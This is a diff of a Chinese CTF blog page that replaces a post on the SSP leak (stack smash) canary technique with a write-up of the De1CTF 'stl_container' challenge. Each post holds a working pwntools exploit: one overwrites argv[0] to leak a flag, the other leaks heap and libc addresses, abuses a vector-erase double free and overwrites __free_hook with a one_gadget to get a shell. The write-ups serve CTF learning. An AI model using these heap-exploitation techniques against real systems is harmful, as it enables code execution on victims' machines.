@@ -88,20 +88,19 @@
 
 
 
-<meta name="description" content="这里恬不知耻的先粘贴一大段i春秋关于ssp leak打法的讲解。其实就是菜，自己讲不出个所以然  除了通过各种方法泄露canary之外，我们还有一个可选项——利用__stack_chk_fail函数泄露信息。这种方法作用不大，没办法让我们getshell。但是当我们需要泄露的flag或者其他东西存在于内存中时，我们可能可以使用一个栈溢出漏洞来把它们泄露出来。这个方法叫做SSP(Stack Smas">
+<meta name="description" content="先来了解一点，在STL容器里面，如果在容器里的内容是一个指针，那么在将其删除的时候，就会调用其自身的析构函数，而指针的析构函数又什么都不会做。造成的结果就是指针指向的内容不会被释放。 以下全是俺胡乱分析的，没看过底层源码，没分析过内存管理(毕竟宁看题目源码能看出个屁) 👴怀疑，在new操作，然后push_back的时候，这玩意儿进行了两步实现这个功能。 第一步就是先⛏一个堆块，把你的data保存">
 <meta property="og:type" content="article">
-<meta property="og:title" content="对于canary的ssp leak打法的学习（好像又名Stack smash）">
-<meta property="og:url" content="http://yoursite.com/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/index.html">
+<meta property="og:title" content="迟来的de1ctf stl解析">
+<meta property="og:url" content="http://yoursite.com/2020/05/12/迟来的de1ctf-stl解析/index.html">
 <meta property="og:site_name" content="zhz&#39;blog">
-<meta property="og:description" content="这里恬不知耻的先粘贴一大段i春秋关于ssp leak打法的讲解。其实就是菜，自己讲不出个所以然  除了通过各种方法泄露canary之外，我们还有一个可选项——利用__stack_chk_fail函数泄露信息。这种方法作用不大，没办法让我们getshell。但是当我们需要泄露的flag或者其他东西存在于内存中时，我们可能可以使用一个栈溢出漏洞来把它们泄露出来。这个方法叫做SSP(Stack Smas">
+<meta property="og:description" content="先来了解一点，在STL容器里面，如果在容器里的内容是一个指针，那么在将其删除的时候，就会调用其自身的析构函数，而指针的析构函数又什么都不会做。造成的结果就是指针指向的内容不会被释放。 以下全是俺胡乱分析的，没看过底层源码，没分析过内存管理(毕竟宁看题目源码能看出个屁) 👴怀疑，在new操作，然后push_back的时候，这玩意儿进行了两步实现这个功能。 第一步就是先⛏一个堆块，把你的data保存">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/canary_a768142147ca3976598941b5c6c67161.png">
-<meta property="og:image" content="http://yoursite.com/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/20191023235955.png">
-<meta property="og:updated_time" content="2019-10-28T15:27:42.139Z">
+<meta property="og:image" content="https://gitee.com/zhzzhz/blog_warehouse/raw/master/img/image-20200512092213646.png">
+<meta property="og:updated_time" content="2020-05-12T03:35:03.974Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="对于canary的ssp leak打法的学习（好像又名Stack smash）">
-<meta name="twitter:description" content="这里恬不知耻的先粘贴一大段i春秋关于ssp leak打法的讲解。其实就是菜，自己讲不出个所以然  除了通过各种方法泄露canary之外，我们还有一个可选项——利用__stack_chk_fail函数泄露信息。这种方法作用不大，没办法让我们getshell。但是当我们需要泄露的flag或者其他东西存在于内存中时，我们可能可以使用一个栈溢出漏洞来把它们泄露出来。这个方法叫做SSP(Stack Smas">
-<meta name="twitter:image" content="http://yoursite.com/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/canary_a768142147ca3976598941b5c6c67161.png">
+<meta name="twitter:title" content="迟来的de1ctf stl解析">
+<meta name="twitter:description" content="先来了解一点，在STL容器里面，如果在容器里的内容是一个指针，那么在将其删除的时候，就会调用其自身的析构函数，而指针的析构函数又什么都不会做。造成的结果就是指针指向的内容不会被释放。 以下全是俺胡乱分析的，没看过底层源码，没分析过内存管理(毕竟宁看题目源码能看出个屁) 👴怀疑，在new操作，然后push_back的时候，这玩意儿进行了两步实现这个功能。 第一步就是先⛏一个堆块，把你的data保存">
+<meta name="twitter:image" content="https://gitee.com/zhzzhz/blog_warehouse/raw/master/img/image-20200512092213646.png">
 
 
 
@@ -131,13 +130,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/">
+  <link rel="canonical" href="http://yoursite.com/2020/05/12/迟来的de1ctf-stl解析/">
 
 
 
 
 
-  <title>对于canary的ssp leak打法的学习（好像又名Stack smash） | zhz'blog</title>
+  <title>迟来的de1ctf stl解析 | zhz'blog</title>
   
 
 
@@ -298,7 +297,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/12/迟来的de1ctf-stl解析/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="zhz">
@@ -315,7 +314,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">对于canary的ssp leak打法的学习（好像又名Stack smash）</h1>
+          <h1 class="post-title" itemprop="name headline">迟来的de1ctf stl解析</h1>
         
 
         <div class="post-meta">
@@ -327,8 +326,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-28T23:24:28+08:00">
-                2019-10-28
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-12T08:59:49+08:00">
+                2020-05-12
               </time>
             
 
@@ -401,29 +400,25 @@
       
 
       
-        <p>这里恬不知耻的先粘贴一大段i春秋关于ssp leak打法的讲解。<del>其实就是菜，自己讲不出个所以然</del></p>
-<p> 除了通过各种方法泄露canary之外，我们还有一个可选项——利用<code>__stack_chk_fail</code>函数泄露信息。这种方法作用不大，没办法让我们getshell。但是当我们需要泄露的flag或者其他东西存在于内存中时，我们可能可以使用一个栈溢出漏洞来把它们泄露出来。这个方法叫做<code>SSP(Stack Smashing Protect) Leak</code>.<br>在开始之前，我们先来回顾一下canary起作用到程序退出的流程。首先，canary被检测到修改，函数不会经过正常的流程结束栈帧并继续执行接下来的代码，而是跳转到<code>call __stack_chk_fail</code>处，然后对于我们来说，执行完这个函数，程序退出，屏幕上留下一行<br><code>*** stack smashing detected ***:[XXX] terminated</code>。这里的[XXX]是程序的名字。很显然，这行字不可能凭空产生，肯定是<code>__stack_chk_fail</code>打印出来的。而且，程序的名字一定是个来自外部的变量（毕竟ELF格式里面可没有保存程序名）。既然是个来自外部的变量，就有修改的余地。我们看一下<code>__stack_chk_fail</code>的源码，会发现其实现如下： </p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>) </span><br><span class="line">&#123;  </span><br><span class="line">    __fortify_fail (<span class="string">"stack smashing detected"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg) </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="comment">/* The loop is added only to keep gcc happy. */</span> </span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)   </span><br><span class="line">        __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,             </span><br><span class="line">                        msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+        <p>先来了解一点，在STL容器里面，如果在容器里的内容是一个指针，那么在将其删除的时候，就会调用其自身的析构函数，而指针的析构函数又什么都不会做。造成的结果就是指针指向的内容不会被释放。</p>
+<p>以下全是俺胡乱分析的，没看过底层源码，没分析过内存管理(毕竟宁看题目源码能看出个屁)</p>
+<p>👴怀疑，在new操作，然后push_back的时候，这玩意儿进行了两步实现这个功能。</p>
+<p>第一步就是先⛏一个堆块，把你的data保存在里面</p>
+<p>第二步才是所谓的push_back，俺以为的就是把这个copy过去，再delete了第一步产生的堆块</p>
+<p>这也就解释了，为什么IDA里面进行new的时候，会出现调用析构函数的情况（大概）</p>
+<p><img src="https://gitee.com/zhzzhz/blog_warehouse/raw/master/img/image-20200512092213646.png" alt></p>
+<p>好了，上面的不大重要。俺们来分析分析漏洞出现的原因。</p>
+<p>De1的源码里调用的是erase函数，那俺们就来康康erase函数的源码</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">iterator <span class="title">erase</span><span class="params">(iterator position)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (position + <span class="number">1</span> != end())</span><br><span class="line">    copy(position + <span class="number">1</span>, finish, position);<span class="comment">//将[position+1,finish)向前移动一个单位</span></span><br><span class="line">  --finish;</span><br><span class="line">  destroy(finish);<span class="comment">//析构最后一个元素</span></span><br><span class="line">  <span class="keyword">return</span> position;<span class="comment">//返回擦除位置的迭代器</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function">iterator <span class="title">erase</span><span class="params">(iterator first, iterator last)</span> </span>&#123;<span class="comment">//擦除一段元素</span></span><br><span class="line">  iterator i = copy(last, finish, first);<span class="comment">//将[last,finish)向前移动last-first个单位</span></span><br><span class="line">  destroy(i, finish);<span class="comment">//析构i到finish之间的元素，但是还可以用</span></span><br><span class="line">  finish = finish - (last - first);<span class="comment">//更新finish</span></span><br><span class="line">  <span class="keyword">return</span> first;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p> 我们看到<code>__libc_message</code>一行输出了<code>*** %s ***: %s terminated\n</code>。这里的参数分别是msg和<code>__libc_argv[0]</code>。<code>char *argv[]</code>是main函数的参数，<code>argv[0]</code>存储的就是程序名，且这个argv[0]就存在于栈上。</p>
-<p>这里贴一个vidar的 Veritas501 师傅的讲解</p>
-<p>可见，__libc_message 的第二个<code>%s</code>输出的是argv[0]，argv[0]是指向第一个启动参数字符串的指针，而在栈中，大概是这样一个画风 </p>
-<img src="/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/canary_a768142147ca3976598941b5c6c67161.png">
+<p>分析前，先提提vector，能够对vector内的任意位置元素进行插入和删除操作。</p>
+<p>vector的底层管理是这样的，先是存在一块内存，里面存储着vector当前的size大小 (begin和end两处指针) 以及最大的size大小，也是指针。跟进begin指针，里面就是vector储存的内容了。</p>
+<p>而我们这题，vector的内容储存的是指针，这就出现一丢丢问题了。主要观察源码里面的destroy()这块地方，它是析构的最后一个元素，当我们进行free (0)的时候，虽然vector也还是会进行删除操作，将数据整体往前移，当然，这里也是本题漏洞点之一，不过先留到下面讲。我们也说了，虽然进行了删除操作，但是实际上底层对其进行的析构还是对于最后一个元素的，也就是第二个的指针，对其进行析构。所以才会出现free(0)</p>
+<p>的情况，实际上被放入bin的是1。</p>
+<p>上面是第一个原因，接下来是第二处。</p>
+<p>vector容器对于删除某一处内存后，会进行copy操作，将该处内存到final的内容整体往前copy。因为是指针，所以第二个的指针就被copy到第一个，此时free(0)也就刚好是再次将其析构。这样就构成了我们所测试出的double free的结果。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">sh = process(<span class="string">'./stl_container'</span>)</span><br><span class="line"><span class="comment">#sh = remote('134.175.239.26',8848)</span></span><br><span class="line">elf = ELF(<span class="string">'stl_container'</span>)</span><br><span class="line">libc = ELF(<span class="string">'libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(container,content)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,str(container))</span><br><span class="line">    sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'data:'</span>,str(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(container,index)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,str(container))</span><br><span class="line">    sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'index'</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(container,index)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,str(container))</span><br><span class="line">    sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'3'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'index'</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">'b'</span>)</span><br><span class="line"><span class="comment">#add</span></span><br><span class="line">delete(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">z()</span><br><span class="line">delete(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment">#z()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#show(2,1)</span></span><br><span class="line"><span class="comment">#add(2,'a')</span></span><br><span class="line"><span class="comment">############ leak ######################</span></span><br><span class="line">show(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">heap_base = u64(sh.recvuntil(<span class="string">'\n'</span>)[<span class="number">-7</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x124B0</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_base)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">'0'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">'0'</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="string">'0'</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="string">'1'</span>)</span><br><span class="line">delete(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment">#delete 3</span></span><br><span class="line">sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'3'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'3'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line"><span class="comment">#delete 4</span></span><br><span class="line">sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'4'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'4'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">show(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">libc_base = u64(sh.recvuntil(<span class="string">'\x7F'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x60</span> <span class="number">-0x10</span> - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">one = libc_base + <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">'0'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">'0'</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="string">'0'</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="string">'1'</span>)</span><br><span class="line">delete(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">2</span>,p64(one))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
-
-
-<p>所以SSP leak的玩法就是通过修改栈上的argv[0]指针，从而让<code>__stack_chk_fail</code>被触发后输出我们想要知道的东西。 </p>
-<p>所以……  这位vidar的pwn王意思就是，管他三七二十一，暴力覆盖就是了，别管多长，只要你要的数据的地址你能拿到，覆盖！</p>
-<p>这里放一个例题，三叶草的纳新题，canary2</p>
-<img src="/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/20191023235955.png">
-
-<p>一看，无法泄露，也不能爆破，那自然就想到ssp leak打法</p>
-<p>flag的地址在buf里面，你又能通过printf  get  buf地址。 那剩下的就只有暴力覆盖了</p>
-<p>这里贴上exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">sh = process(<span class="string">'./canary2'</span>)</span><br><span class="line"><span class="comment">#sh = remote('pwnto.fun',10007)</span></span><br><span class="line">sh.recvuntil(<span class="string">'key: '</span>)</span><br><span class="line">key = sh.recv(<span class="number">9</span>)</span><br><span class="line">log.success(<span class="string">"the key="</span>+ key)</span><br><span class="line">key = key[<span class="number">2</span>:]</span><br><span class="line">log.success(<span class="string">"the key="</span>+ key)</span><br><span class="line">key = int(key,<span class="number">16</span>)</span><br><span class="line">payload = p64(key)*<span class="number">200</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline()</span><br><span class="line">sh.recv()</span><br></pre></td></tr></table></figure>
-
-<p>​        对了，这里记录一点我个人的小问题，recv接收后的key是字符串类型，所以不进行p64(key)直接发过去的是ascll，不是我们想要的指针类型。</p>
-<p>​        寻思着，那打包一下就可以了吧。发现p64(key)失败，探究了一下，发现是字符串型转字符串型失败。又想着key = int(key)，也不成功。那是因为，int()是有两个参数的，我以前一直以为直接int(x)就好了。2333333333</p>
 
       
     </div>
@@ -440,12 +435,12 @@
   <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
   <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
   <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
-  <p><span>本文标题:</span><a href="/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/">对于canary的ssp leak打法的学习（好像又名Stack smash）</a></p>
+  <p><span>本文标题:</span><a href="/2020/05/12/迟来的de1ctf-stl解析/">迟来的de1ctf stl解析</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 zhz 的个人博客">zhz</a></p>
-  <p><span>发布时间:</span>2019年10月28日 - 23:10</p>
-  <p><span>最后更新:</span>2019年10月28日 - 23:10</p>
-  <p><span>原始链接:</span><a href="/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/" title="对于canary的ssp leak打法的学习（好像又名Stack smash）">http://yoursite.com/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/</a>
-    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/" aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2020年05月12日 - 08:05</p>
+  <p><span>最后更新:</span>2020年05月12日 - 11:05</p>
+  <p><span>原始链接:</span><a href="/2020/05/12/迟来的de1ctf-stl解析/" title="迟来的de1ctf stl解析">http://yoursite.com/2020/05/12/迟来的de1ctf-stl解析/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2020/05/12/迟来的de1ctf-stl解析/" aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
 </div>
@@ -481,7 +476,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://yoursite.com/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/" title="对于canary的ssp leak打法的学习（好像又名Stack smash）">http://yoursite.com/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/</a>
+    <a href="http://yoursite.com/2020/05/12/迟来的de1ctf-stl解析/" title="迟来的de1ctf stl解析">http://yoursite.com/2020/05/12/迟来的de1ctf-stl解析/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -503,8 +498,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/10/28/fastedbin-attack-探究/" rel="next" title="fastedbin attack 探究">
-                <i class="fa fa-chevron-left"></i> fastedbin attack 探究
+              <a href="/2020/04/15/堆攻击手段整理总结/" rel="next" title="堆攻击手段整理总结">
+                <i class="fa fa-chevron-left"></i> 堆攻击手段整理总结
               </a>
             
           </div>
@@ -512,10 +507,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/10/28/对于ret2-resolve的探究/" rel="prev" title="对于ret2dl_resolve的探究">
-                对于ret2dl_resolve的探究 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
